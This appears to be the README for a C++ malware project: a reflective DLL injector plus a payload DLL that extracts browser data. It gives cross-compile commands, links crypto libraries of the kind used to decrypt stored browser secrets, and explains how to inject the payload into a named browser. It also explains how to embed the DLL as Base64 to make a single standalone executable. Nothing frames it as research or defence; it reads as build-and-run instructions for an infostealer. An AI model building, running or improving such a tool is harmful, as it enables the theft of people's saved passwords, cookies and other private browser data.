# C++ Version: Injector & Payload

This directory contains the C++ translation of the original Rust project. It consists of a reflective injector and a browser data extraction payload.

## Structure
- `injector/`: Contains the C++ source for the injector.
- `payload/`: Contains the C++ source for the payload DLL.

## Dependencies
- **MinGW-w64**: For cross-compiling to Windows on Linux.
- **SQLite3 & nlohmann/json**: These are required for the payload. You can download them automatically using the provided script:
  ```bash
  chmod +x download_deps.sh
  ./download_deps.sh
  ```

## Compilation

### Injector
```bash
x86_64-w64-mingw32-g++ -O2 injector/main.cpp -o injector/injector.exe -ladvapi32 -lshlwapi -lshell32 -static
```

### Payload
```bash
# Compile SQLite first
x86_64-w64-mingw32-gcc -O2 -c payload/sqlite3.c -o payload/sqlite3.o
# Compile the Payload DLL
x86_64-w64-mingw32-g++ -O2 -shared payload/main.cpp payload/sqlite3.o -o payload/payload.dll -lbcrypt -lcrypt32 -lole32 -loleaut32 -static -Ipayload/
```

## Usage
1. **Compile the Payload**: Compile `payload/main.cpp` to `payload.dll` as described above. Ensure `sqlite3.c`, `sqlite3.h`, and `nlohmann/json.hpp` are in the correct locations.
2. **Compile the Injector**: Compile `injector/main.cpp` to `injector.exe`.
3. **Run**: Place `payload.dll` in the same directory as `injector.exe` and run:
   ```bash
   injector.exe [browser_name]
   ```
   *Optional*: You can encode `payload.dll` to Base64 and update the `EMBEDDED_DLL_BASE64` constant in `injector/main.cpp` to create a single standalone executable.
